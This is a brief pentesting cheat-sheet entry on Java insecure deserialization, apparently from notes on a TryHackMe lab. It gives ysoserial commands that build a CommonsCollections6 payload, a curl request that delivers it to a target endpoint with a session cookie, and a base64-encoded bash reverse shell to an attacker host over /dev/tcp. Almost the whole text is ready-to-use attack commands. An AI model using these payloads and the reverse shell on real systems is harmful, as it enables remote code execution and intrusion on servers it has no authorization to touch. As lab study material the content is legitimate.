# Deserialization

Java insecure deserialization (`ObjectInputStream.readObject()` on unfiltered input) + a vulnerable gadget library (e.g. commons-collections < 3.2.2) → RCE via ysoserial.

```bash
# build ysoserial in docker (works around local JDK version issues)
# Dockerfile: FROM eclipse-temurin:8-jre; wget ysoserial-all.jar <release>;
#   ENTRYPOINT ["java","-jar","ysoserial-all.jar"]

docker run --rm --platform linux/amd64 ysoserial:latest \
  CommonsCollections6 "curl http://<LHOST>:8000" | base64 > payload.b64

curl -X POST --data-binary @payload.b64 http://<TARGET>:<RPORT>/<import-endpoint> \
  -H 'Cookie: JSESSIONID=<sid>' -H "Content-Type: text/plain" -v

# multi-command reverse shell (Runtime.exec can't take a full shell pipeline directly)
# BASE64 = base64 of: bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}
```

— TryHackMe / IronHold (commons-collections 3.2.1, CommonsCollections6 gadget chain)
